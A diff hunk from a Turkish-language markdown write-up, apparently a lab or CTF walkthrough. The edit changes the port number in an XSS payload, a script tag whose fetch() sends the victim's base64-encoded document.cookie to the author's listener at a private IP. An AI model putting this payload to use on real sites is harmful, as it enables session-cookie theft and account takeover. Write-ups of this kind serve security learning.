@@ -146,7 +146,7 @@ Basit bir XSS payload'ı hazırladım:
 <img width="1716" height="484" alt="xsspayload" src="https://github.com/user-attachments/assets/a122590e-2a6d-41dc-9f61-3c6254540424" />
 
 ```html
-<script>fetch("http://192.168.154.242:81/test.php?data="+btoa(document.cookie));</script>
+<script>fetch("http://192.168.154.242:82/test.php?data="+btoa(document.cookie));</script>
 ```
 
 Kendi makinemde gelen isteği dinlemek için listener açtım:
